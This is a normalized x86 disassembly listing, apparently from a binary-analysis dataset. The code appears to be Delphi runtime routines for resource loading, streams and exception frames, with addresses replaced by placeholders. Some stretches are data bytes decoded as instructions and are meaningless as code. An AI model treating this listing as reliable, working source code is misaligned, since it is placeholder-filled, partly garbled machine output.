pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_415e80
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_4069dc
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_4069c0
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_4069b0
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
test ecx ecx
jne r-xdata
sub_415f0c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_415e2c
sub_415f5c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4044a0
mov ecx eax
mov edx esi
mov eax edi
call sub_416024
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_415fb4
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_416017
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41601e
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_416024
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_415fb4
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_415d4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_415fb4
pop ecx
sub_416090
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4069ac
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4160e0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_416128
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_416158
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
popad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x18004161 ] bh
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add ah cl
bound eax [ ecx ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add ah bl
bound eax [ ecx ]
push cs
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
sbb [ edx + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ecx + 0x41 ] dl
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040d0
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404540
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404034
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404034
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41622c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404034
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404034
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_416284
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040d0
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404540
mov al 0x1
inc ebx
sub_4162dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416353
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40564c
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410ec8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41635a
lea eax [ ebp - 0x4 ]
call sub_40564c
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4107d8
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_40564c
mov ecx eax
mov eax esi
pop edx
call sub_40ce30
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_40564c
sub_416360
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416406
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41640d
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040d0
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419934
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407ce4
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416428
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413ad0
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413ad0
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413918
sub_416460
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413ad0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413ad0
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413964
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413918
sub_4164a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416641
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413de0
mov edi eax
xor edx edx
push ebp
push sub_416622
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416629
mov eax [ rw-data ]
call sub_413e44
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416603
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4165b1
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_413a74
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4135c0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4165b8
mov eax [ ebp - 0x8 ]
call sub_403290
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410904
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416428
pop ecx
mov edx esi
mov eax edi
call sub_413964
mov eax ebx
call sub_403290
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416360
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416460
pop ecx
inc esi
sub_4165b8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_416650
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413de0
mov edi eax
xor eax eax
push ebp
push sub_4166eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e44
retn
mov edx ebx
mov eax edi
call sub_413a74
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413964
mov eax esi
call sub_403290
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407ce4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4166fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413de0
mov edi eax
xor eax eax
push ebp
push sub_416773
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e44
retn
mov edx ebx
mov eax edi
call sub_413a74
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413964
mov eax esi
call sub_403290
sub_4167a4
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
pop ecx
pop edx
pop ebx
retn
sub_4167e8
push ebx
push esi
push edi
call sub_40361c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416128
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_416824
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4186fc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41880c
call sub_416798
sub_416848
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407ce4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403fe0
sub_41687c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407ce4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186fc
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41693d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_416cc0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_416cc0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416944
mov eax [ ebp - 0x8 ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41880c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_416798
sub_41696c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41698c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_40427c
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403514
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_416798
sub_4169f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413de0
mov esi eax
xor edx edx
push ebp
push sub_416a64
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a6b
mov eax [ rw-data ]
call sub_413e44
retn
mov edx ebx
mov eax esi
call sub_413a74
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403290
mov edx ebx
mov eax esi
call sub_413964
sub_416a70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416b7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b86
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
xor edx edx
push ebp
push sub_416b62
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416bb4
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_416284
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413a74
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404078
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416360
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413a74
call sub_4169f4
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413a74
mov edx eax
mov eax [ rw-data ]
call sub_413d58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_413b68
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_416b90
push ebx
mov ebx eax
mov eax ebx
call sub_416c84
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4156ec
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_416bb4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403290
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_413a74
call sub_403290
inc edi
dec esi
jne r-xdata
sub_416bf0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031d8
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_413108
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40321c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413180
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413080
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031f4
test al al
jne r-xdata
sub_416cc0
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_416d0c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_416d0c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
sub_416d5c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_416da7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41855c
mov eax [ ebp - 0x4 ]
call sub_4042a0
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416dae
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
call sub_416798
sub_416db4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_416e54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416958
test al al
jne r-xdata
mov eax ebx
call sub_416958
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4142ac
jmp r-xdata
mov eax ebx
call sub_416c9c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_4178c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e5b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41428c
mov esi eax
mov eax ebx
call sub_4178bc
jmp r-xdata
mov eax ebx
call sub_41780c
mov eax ebx
call sub_416958
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417a28
mov eax ebx
call sub_4178c4
sub_416e84
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404dd8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413918
inc esi
dec ebx
jne r-xdata
sub_416ec0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_419a50
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404dd8
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f94
add esp 0x4
mov edx ebx
mov eax edi
call sub_419a24
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404dd8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_419a24
test [ eax + 0x24 ] 0x4
je r-xdata
sub_416f38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404dd8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
